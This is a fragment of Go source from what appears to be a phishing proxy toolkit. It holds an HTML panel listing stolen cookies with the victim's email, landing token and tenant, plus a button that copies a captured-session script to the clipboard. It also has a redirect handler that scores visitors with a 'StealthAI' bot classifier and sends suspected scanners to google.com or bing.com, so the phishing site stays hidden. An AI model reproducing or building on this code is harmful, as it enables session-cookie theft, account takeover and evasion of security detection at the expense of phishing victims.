  <div>Cookies obtained: <span style="color:#888">%d</span></div>
</div>
<script>
var snippet=%s;
var ta=document.getElementById('ta');
function doCopy(){
  if(navigator.clipboard&&navigator.clipboard.writeText){
    navigator.clipboard.writeText(snippet).then(showOk).catch(legacyCopy);
  } else { legacyCopy(); }
}
function legacyCopy(){
  ta.select();ta.setSelectionRange(0,99999);
  try{if(document.execCommand('copy'))showOk();}catch(e){}
}
function showOk(){var o=document.getElementById('ok');o.style.display='inline';setTimeout(function(){o.style.display='none';},2500);}
ta.addEventListener('click',function(){ta.select();ta.setSelectionRange(0,99999);});
ta.addEventListener('focus',function(){ta.select();ta.setSelectionRange(0,99999);});
</script>
</body></html>`,
		template.HTMLEscapeString(email),
		template.HTMLEscapeString(landingToken),
		len(entries),
		statusNote,
		template.HTMLEscapeString(email),
		template.HTMLEscapeString(script),
		template.HTMLEscapeString(email),
		template.HTMLEscapeString(tenant),
		len(entries),
		string(scriptJSON),
	)
}

// HandleRedirect returns an http.HandlerFunc that implements the same redirect logic as
// HttpServer.handleRedirect but is usable outside the core package. This allows tests
// and tools to reuse the redirect behavior by providing a Config.
func HandleRedirect(cfg *Config) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if cfg != nil && cfg.IsStealthAIEnabled() {
			packet := r.UserAgent() + "|" + r.RemoteAddr + "|" + r.URL.String()
			score, err := AnalyzeTrafficWithStealthAI(packet)
			if err == nil {
				log.Info("StealthAI score: %f for UA: %s", score, r.UserAgent())
				if score > 0.85 {
					log.Warning("Bot detected and blocked: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
					http.Redirect(w, r, "https://www.google.com", http.StatusFound)
					return
				} else if score > 0.5 {
					log.Warning("Suspicious traffic redirected: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
					http.Redirect(w, r, "https://www.bing.com", http.StatusFound)
					return
				} else {
					log.Info("Normal user allowed: UA=%s IP=%s", r.UserAgent(), r.RemoteAddr)
				}
			}
		}
		http.Redirect(w, r, "https://"+r.Host+r.URL.String(), http.StatusFound)
	}
}
